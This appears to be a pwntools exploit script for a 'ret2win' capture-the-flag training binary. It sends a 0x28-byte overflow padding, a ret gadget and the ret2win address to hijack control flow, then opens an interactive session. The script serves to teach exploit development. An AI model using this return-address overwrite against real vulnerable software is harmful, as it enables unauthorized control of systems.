from pwn import *

context.log_level = "debug"
r = process("./ret2win")
exe = r.elf
ret = 0x40053E

payload = cyclic(0x28) + p64(ret) + p64(exe.sym["ret2win"])
r.recvuntil(b"> ")
r.send(payload)
r.interactive()
